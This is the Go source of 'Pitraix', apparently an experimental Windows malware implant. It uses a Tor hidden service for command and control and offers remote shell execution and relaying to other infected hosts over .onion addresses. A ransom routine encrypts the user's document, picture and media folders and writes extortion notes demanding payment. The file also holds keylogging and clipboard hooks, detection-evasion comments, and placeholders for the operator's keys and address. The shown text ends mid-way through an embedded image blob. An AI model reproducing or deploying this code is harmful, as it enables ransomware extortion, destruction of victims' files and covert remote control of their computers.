/*
	THIS IS EXPERIEMENTAL PAYLOAD TARGETTING WINDOWS

	- 2 RSA key hardcoded differently for encryption and signature
	keys are hardcoded into the code it's self and never change, one is responsible for encryption and other for signature verification

	- Generally after registering with agent, the HST would use his AES key for encrypted communications and not RSA
	
	- Registering goes like this:
	HST generates 256-bit-AES key, encrypts it with hardcoded Agent public-key and sends it to Agent/Operative(camaoflagued as an agent)
	Then HST would only use that AES key for communcations

	- If things could be random, even pesudorandom, lyst would do so. This rule applies to ports, locations, names, length of names of all files Pitraix will drop. To reduce detection rate
*/

package main

import (
    "fmt"
	"time"
	"crypto"
	"crypto/tls"
	"crypto/aes"
    "crypto/cipher"
    "crypto/rand"
	"crypto/rsa"
	rdmod "math/rand"
    "crypto/sha512"
	"crypto/x509"
	"encoding/hex"
    "encoding/pem"
    "encoding/base64"
	"encoding/json"
	"unicode"
	"strings"
	"strconv"
	"bytes"
	"os"
	"os/exec"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"net"
	"archive/zip"
	"path/filepath"
	"syscall"

	"unsafe"
	"golang.org/x/net/proxy"
	"github.com/atotto/clipboard"
	"github.com/TheTitanrain/w32"
)

const (
	osName = 1
	ddosCounter = 45 // Do not change this unless you know what you are doing

	raw_OPEncryptionKeyPEM = `~~YOUR RSA PUBLIC KEY - RUN SETUPCRYPTO.GO~~`

	raw_OPSigningKeyPEM = `~~OPTIONAL - YOUR BACKUP RSA PUBLIC KEY~~`

	agentAddress = "modify this manually with your onion address or run OPER for first time"
)

var (
	alphaletters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

	user32                  = syscall.NewLazyDLL("user32.dll")
	systemParametersInfo = user32.NewProc("SystemParametersInfoW")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")

	config_FilePath = "Pitraix"
	pitraix_FilePath = "Pitraix"
	tor_FolderPath = "Pitraix"

	tmpFold 	 = os.Getenv("tmp")

	username 	 = os.Getenv("username") // strings.TrimSpace(doInstru("shell", "echo %username%"))
	osArch 		 = os.Getenv("PROCESSOR_ARCHITECTURE") // strings.Split(strings.TrimSpace(doInstru("shell", "wmic os get osarchitecture")), "\n")[1]
	userHomeDIR  = os.Getenv("USERPROFILE")
	mainDrive    = os.Getenv("HOMEDRIVE")
	shell		 = mainDrive + "\\Windows\\System32\\cmd.exe"

	PrivPaths = []string{
		mainDrive + "\\Windows",
		mainDrive + "\\Windows\\Logs",
		mainDrive + "\\Windows\\security",
		mainDrive + "\\Windows\\System32",
	}

	nonPrivPaths = []string{
		mainDrive + "\\Users\\" + username + "\\AppData\\Local",
		mainDrive + "\\Users\\" + username + "\\AppData\\Roaming",
		mainDrive + "\\Users\\" + username + "\\AppData\\Roaming\\Microsoft",
		mainDrive + "\\Users\\" + username + "\\AppData\\LocalLow",
	}

	torProxyUrl, _ = url.Parse("SOCKS5H://127.0.0.1:9050")

	tbDialer, _ = proxy.FromURL(torProxyUrl, proxy.Direct)

	contactDate string
	firstTime bool
	
	locAES_Key []byte
	AES_Key []byte
	
	cft config_File_Type
	confAsyncChn = make(chan []string)

	certError_Count int
	currentPath, _ = os.Executable()
)

type config_File_Type struct {
	Events   map[string][]string
	Logs 	 map[string][]string
	Modules	 map[string][]string
	RegTmp   []string
	RoutesH  []string
	Register bool
	AES_Key  string
	ContactD string
}

// type instruType struct {
// 	INSTS []string
// }

type ipInfo struct {
	IP 		 string
	Hostname string
	City 	 string
	Region 	 string
	Country  string
	Org 	 string
	Timezone string
}

func setwallpaperFile(filename string) error {
	filenameUTF16, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return err
	}

	systemParametersInfo.Call(
		uintptr(0x0014),
		uintptr(0x0000),
		uintptr(unsafe.Pointer(filenameUTF16)),
		uintptr(0x01|0x02),
	)
	return nil
}

func pemDec(key string) *pem.Block {
	temp_pem_decode, _ := pem.Decode([]byte(key))
	return temp_pem_decode
}

func readFile(filePath string) ([]byte, error){
	file, err := os.Open(filePath)
	if err != nil {
		// fmt.Println("Reading file error:", filePath, err)
		return []byte{}, err
	}
	defer file.Close()

	fs, _ := file.Stat()
	// fmt.Println("File size:", fs.Size())
	b := make([]byte, fs.Size())

	for {
		_, err := file.Read(b)
		if err != nil {
			if err != io.EOF {
				// fmt.Println("real weird happened while reading file", filePath, err)
				return []byte{}, err
			}
			break
		}
	}

	// fmt.Println(string(b))

	return b, nil
}


func isASCII(s string) bool {
    for _, c := range s {
        if c > unicode.MaxASCII {
            return false
        }
    }
    return true
}

func allZero(s []byte) bool {
    for _, v := range s {
        if v != 0 {
            return false
        }
    }
    return true
}

func createConfFile(problem string) {
	// AES_Key = random_Bytes(32, true)
	cft.AES_Key = base64.StdEncoding.EncodeToString(AES_Key)
	cft.ContactD = contactDate
	cft.Logs = map[string][]string{"1": {"firstTime", "There was error with config file and had to fix: " + problem, contactDate}}
	cft.Events = map[string][]string{"1": {"firstTime", "Opened implant", contactDate}}
	cft.Modules = map[string][]string{"0": {}}
	cft.RegTmp  = []string{}
	cft.RoutesH = []string{}
	cft.Register = false
	
	out, _ := json.Marshal(cft)
	pl_encrypted, pl_nonce, _ := encrypt_AES(out, locAES_Key)
	f, _ := os.Create(config_FilePath)
	f.WriteString(base64.StdEncoding.EncodeToString(pl_encrypted) + "|" + base64.StdEncoding.EncodeToString(pl_nonce))
	f.Close()
}

func confUpdaterAsync() {
	for nc := range confAsyncChn {
		cft.updateConf(nc[0], nc[1:])
		// data_splitted := strings.Split(data, "|")
		// cft.updateConf(data_splitted[0], strings.Split(data[len(data_splitted[0]) + 1:], "|"), locAES_Key)
	}
}

func (cft *config_File_Type) updateConf(ind string, val []string) {
	// fmt.Println(ind, val, locAES_Key)
	fc, err := readFile(config_FilePath)
	if err != nil {
		fmt.Println("no conf file: ", config_FilePath, err)
		AES_Key = random_Bytes(32, true)
		createConfFile("conf file not exist")
		cft.updateConf(ind, val)
		fmt.Println("fixed")
		firstTime = true
	} else {
		fc_splitted := strings.Split(string(fc), "|")
		if len(fc_splitted) != 2 {
			AES_Key = random_Bytes(32, true)
			createConfFile("conf file tampered not len 2")
			cft.updateConf(ind, val)
			fmt.Println("fixed")
			firstTime = true
			// os.Remove(config_FilePath)
		} else {
			fc_deciphered, err := base64.StdEncoding.DecodeString(fc_splitted[0])
			if err != nil {
				AES_Key = random_Bytes(32, true)
				createConfFile("conf file base64 1 tampered")
				cft.updateConf(ind, val)
				fmt.Println("fixed")
				firstTime = true
				// os.Remove(config_FilePath)
			} else {
				fc_nonce, err := base64.StdEncoding.DecodeString(fc_splitted[1])
				if err != nil {
					AES_Key = random_Bytes(32, true)
					createConfFile("conf file base64 2 tampered")
					cft.updateConf(ind, val)
					fmt.Println("fixed")
					firstTime = true
					// os.Remove(config_FilePath)
				} else {
					if len(fc_nonce) != 12 {
						fmt.Println("Invalid nonce length", len(fc_nonce), fc_nonce)
						AES_Key = random_Bytes(32, true)
						createConfFile("conf file invalid nonce length")
						cft.updateConf(ind, val)
						fmt.Println("fixed")
						firstTime = true
						// os.Remove(config_FilePath)
					} else {
						decrypted_fc, err := decrypt_AES(fc_deciphered, fc_nonce, locAES_Key)
						if err != nil {
							AES_Key = random_Bytes(32, true)
							createConfFile("conf file decryption error")
							cft.updateConf(ind, val)
							fmt.Println("fixed")
							firstTime = true
							// os.Remove(config_FilePath)
						} else {
							// fmt.Println(string(decrypted_fc))
							err = json.Unmarshal(decrypted_fc, &cft)
							if err != nil {
								AES_Key = random_Bytes(32, true)
								createConfFile("conf file unmarshal error tampered")
								cft.updateConf(ind, val)
								fmt.Println("fixed")
								firstTime = true
								// os.Remove(config_FilePath)
							} else {
								// cft.AES_Key, _ = base64.StdEncoding.DecodeString(cft.AES_Key)
								if ind == "aes" {
									cft.AES_Key = val[0]
								} else if ind == "contactd" {
									cft.ContactD = val[0]
								} else if ind == "register" {
									fmt.Println("got register")
									if val[0] == "true" {
										fmt.Println("set register to true")
										cft.Register = true
									} else {
										cft.Register = false 
									}
								} else if ind == "logs" {
									cft.Logs[strconv.Itoa(len(cft.Logs) + 1)] = []string{val[0], val[1], val[2]}

								} else if ind == "clearlogs" {
									cft.Logs = map[string][]string{"1": {"clear", "cleared logs upon request", contactDate}}

								} else if ind == "events" {
									// fmt.Println("current len is:", len(cft.Events))
									cft.Events[strconv.Itoa(len(cft.Events) + 1)] = []string{val[0], val[1], val[2]}
									// fmt.Println(len(cft.Events), "done", ind, val)
									// fmt.Println(cft.Events)

								} else if ind == "modules" {
									cft.Modules[strconv.Itoa(len(cft.Modules) + 1)] = []string{val[0], val[1], val[2]}
									
								} else if ind == "regtmp" {
									cft.RegTmp = append(cft.RegTmp, val[0])

								} else if ind == "clearregtmp" {
									cft.RegTmp = []string{}

								} else if ind == "routesh" {
									cft.RoutesH = append(cft.RoutesH, val[0])

								} else if ind == "clearroutesh" {
									cft.RoutesH = []string{}

								} else if ind == "fetch" {
								} else {
									fmt.Println("Invalid index!", ind, val)
								}
								// fmt.Println(cft, ind, val)
								
								AES_Key, _ = base64.StdEncoding.DecodeString(cft.AES_Key)

								if ind != "fetch" {
									// fmt.Println("config file unmrashalled:", cft)
									f, err := os.Create(config_FilePath)
									if err != nil {
										fmt.Println("Error writing conf file!!!", config_FilePath, err)
										// os.Remove(config_FilePath)
									} 
									out, _ := json.Marshal(cft)
									pl_encrypted, pl_nonce, _ := encrypt_AES(out, locAES_Key)
									pl_encoded := fmt.Sprintf("%s|%s", base64.StdEncoding.EncodeToString(pl_encrypted), base64.StdEncoding.EncodeToString(pl_nonce))
									f.WriteString(pl_encoded)

									fmt.Println("updated conf file")	
								} else {
									fmt.Println("updated cft but not conf file")
								}
							}
						}
					}
				}
			}
		}
	}
}

func isadmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func bytesumbig(v []byte) int {
	sum := 0
	for i, v := range v {
		// fmt.Println(sum)
		sum += int(v) + i * sum
	}
	// fmt.Println(sum)
	return sum
}

func predictable_random(iv string, size int, t bool) (string, int) {
	// var chosenValue string
	var sumForSeed = bytesumbig([]byte(iv))

	rdmod.Seed(int64(sumForSeed + size + len(iv)))

	if size == 0 {
		size = rdmod.Intn(len(iv)-1) + 1
	}
	
	x := fmt.Sprintf("%x", sha512.Sum512([]byte("pitraix" + iv)))
	sumForSeed = bytesumbig([]byte(x))
	rdmod.Seed(int64(sumForSeed + size + len(x)))
	// fmt.Println(iv, size, x)
	
	if t == true {
		s := make([]rune, size)
		for i := range s {
			s[i] = alphaletters[rdmod.Intn(len(alphaletters))]
		}
		return string(s), 0
	} else {
		var s string = ""
		for i := 0; i < size; i++ {
			rdmod.Seed(int64(i + size + len(iv) * sumForSeed))
			s += fmt.Sprintf("%d", rdmod.Intn(9) + 1)
			// fmt.Println(i, size, len(iv), sumForSeed, s)
		}

		i,_ := strconv.Atoi(s)
		return "", i
	}
}

func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) string {
	// bypassCountries := []string{
	// 	"CN", // China
	// 	"IR", // Iran
	// 	"EG", // Egypt
	// 	"IQ", // Iraq
	// 	"PK", // Pakistan
	// 	"RU", // Russia
	// }
	// linux implementation
	// if !file_Exists(path + "\\" + name) || forceSetup == true { // download + unzip + extract tor only		
	if !file_Exists(filepath.Join(path, name)) || forceSetup == true {
		// if inFindStr(ipinfo_struct.Country, bypassCountries) {
		fmt.Println("Tor not found!", !file_Exists(filepath.Join(path, name)), forceSetup)
		
		var v1m, v2m, v3m int = 11, 4,  0
		var found bool = false
		for {
			tor, err := getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/", v1m ,v2m, v3m), false, 10)
			if err != nil {
				certError_Count += 1
				if certError_Count == 5 {
					http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
					fmt.Println("####### IMPORTANT ####### InsecureSkipVerify: true")
				}
				fmt.Println(err)
				time.Sleep(time.Second * 5)
				continue
			}
			if len(tor) < 300 {
				fmt.Println("Not found", v1m, v2m, v3m)
				if v3m == 20 {
					v3m = 0
					v2m += 1
				} else {
					v3m += 1
				}

				if v2m == 20 {
					v2m = 0
					v1m += 1
				}

				// if v1m == 20 {
				// 	v1m +=
				// }
				if found == false {
					continue
				}
			}
			if found == false {
				fmt.Println("Found, doing found check..")
				found = true
			} else {
				var downloadType string
				if osArch == "AMD64" || osArch == "64-bit" {
					downloadType = "64"
				} else if osArch == "x86" || osArch == "32-bit" {
					downloadType = "32"
				} else {
					fmt.Println("unknown osArch:", osArch)
				}
				x := fmt.Sprintf(`<a href="tor-win%s`, downloadType)
				y := strings.Index(string(tor), x)
				z := strings.TrimSpace(string(tor)[y + 5:y + 70])
				
				st := strings.Index(z, ">") + 1
				ed := strings.Index(z, "<")
				fnl := strings.TrimSpace(z[st:ed])
				
				tor, _ = getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/%s", v1m, v2m, v3m, fnl), false, -1)
				// fmt.Println(tor, err)

				f, _ := os.Create(filepath.Join(path, name + ".zip")) // path + "\\" + name + ".zip")
				f.Write(tor)
				f.Close()
				break
			}

		}

		unzip(filepath.Join(path, name + ".zip"), filepath.Join(path, name))

		os.Remove(filepath.Join(path, name + ".zip"))

		torrcf, _ := os.Create(filepath.Join(path, name, name + "torrc")) // os.Create(path + "\\" + name + "\\" + name + "torc")
		defer torrcf.Close()
		torrcf.Write([]byte(fmt.Sprintf(`HiddenServiceDir %s
HiddenServicePort 80 127.0.0.1:%s`, filepath.Join(path, name, name + "hid"), port))) // path + "\\" + name + "\\" + name + "hid", port)))

	}	

	doInstru("shellnoop", filepath.Join(path, name, "Tor", "tor.exe") + " -f " + filepath.Join(path, name, name + "torrc")) // path + "\\" + name + "\\Tor\\tor.exe -f " + path + "\\" + name + "\\" + name + "torc")
	time.Sleep(time.Second * 5) // ensures we have enough time to connect and generate hostname

	hostnamef, err := readFile(filepath.Join(path, name, name + "hid", "hostname")) // path + "\\" + name + "\\" + name + "hid\\hostname")
	rhostname := strings.Split(string(hostnamef), ".")[0]
	if err != nil {
		fmt.Println("hostname read error:", err)
		// doInstru("shell", "rm -rf " + path + "\\" + name)
		rhostname = setupTor(path, port, name, ipinfo_struct, true)
	}

	return rhostname
}

func doInstru(ic, iv string) string {
	// fmt.Println("doInstru", ic, iv)
	var out string 
	switch (ic) {
	case "shell": // shell instruction with output (locking)
		cmd := exec.Command(shell, "/c", iv)
		var outbuffer bytes.Buffer

		cmd.Stderr = &outbuffer
		cmd.Stdout = &outbuffer
		cmd.Run()
		
		out = outbuffer.String()

	case "shellnoop": // shell instruction without output (non locking)
		cmd := exec.Command(shell, "/c", iv)
		cmd.Start()
	
	case "cuexe":
		out = currentPath

	case "cufol":
		fmt.Println(currentPath, filepath.Dir(currentPath))
		out = filepath.Dir(currentPath)

	case "snatchregs": // snatches registered hosts from agent
		if len(cft.RegTmp) > 0 {
			outb, _ := json.Marshal(cft.RegTmp)
			confAsyncChn <- []string{"clearregtmp", "1"} // SAFE clears hosts to save space
			// cft.RegTmp = []string{} // UNSAFE clears hosts to save space
			out = string(outb)
		} else {
			out = "No registers to snatch"
		}

	case "snatchlogs": // snatches registered hosts from agent
		if len(cft.Logs) > 0 {
			outb, _ := json.Marshal(cft.Logs)
			// confAsyncChn <- []string{"clearlogs", "1"} // SAFE clears hosts to save space
			out = string(outb)
		} else {
			out = "No logs to snatch"
		}
	
	case "snatchevents": // snatches registered hosts from agent
		if len(cft.Events) > 0 {
			outb, _ := json.Marshal(cft.Events)
			// confAsyncChn <- []string{"clearlogs", "1"} // SAFE clears hosts to save space
			out = string(outb)
		} else {
			out = "No events to snatch"
		}

	case "assign":
		confAsyncChn <- []string{"routesh", iv}

	case "relay":
		fmt.Println("############ GOT RELAY")
		ivspl := strings.Split(iv, " ")
		if ivspl[0] == "*" { // relay to all routes hosts
			for _, v := range cft.RoutesH {
				fmt.Println("V:", v)
				response, err := postRequest("http://" + v + ".onion", []byte(iv[2:]), true, 25)
				fmt.Println(string(response), err)
				out += string(response) + "\n"
			}
		} else { // targeted relay
			fmt.Println("TARGETED RELAY DETECTED: PAYLOAD: ", ivspl[1], "TO " + ivspl[0])
			go func(ivspl []string) {
				response, err := postRequest("http://" + ivspl[0] + ".onion", []byte(ivspl[1]), true, 25)
				fmt.Println(string(response), err)
				// out += string(response) + "\n"
			}(ivspl)
		}
		out = strings.TrimSpace(out)

	case "ransom":
		ivspl := strings.Split(iv, " ")
		if len(ivspl) != 4 {
			fmt.Println("error ransom split:", ivspl)
			out = "Error: len not 4"
		} else {
			key, err := base64.StdEncoding.DecodeString(ivspl[3])
			if err != nil {
				fmt.Println("error ransom key:", err)
				out = "Error:" + err.Error()
			} else {
				text := fmt.Sprintf("All your files have been encrypted. Do not bother searching online. Only people on earth that can decrypt your files are us.\nTo start decryption process, send %s %s to this address:\n%s", ivspl[0], ivspl[1], ivspl[2])
				fmt.Println("RANSOOOM", iv, key, text)

				target_paths := []string{
					mainDrive + "\\" + "Users\\" + username + "\\Desktop",
					mainDrive + "\\" + "Users\\" + username + "\\Documents",
					mainDrive + "\\" + "Users\\" + username + "\\Downloads",
					mainDrive + "\\" + "Users\\" + username + "\\Pictures",
					mainDrive + "\\" + "Users\\" + username + "\\Videos",
					mainDrive + "\\" + "Users\\" + username + "\\Music",
				}
				for _, path := range target_paths {
					go encFiles(path, key)
				}
				
				time.Sleep(2 * time.Second)

				for i := 0; i < 69; i++ {
					f, _ := os.Create(target_paths[0] + fmt.Sprintf("\\READ_ME_%d.txt", i + 1))
					f.WriteString(text)
					f.Close()
				}

				go func() {
					wallpaper := `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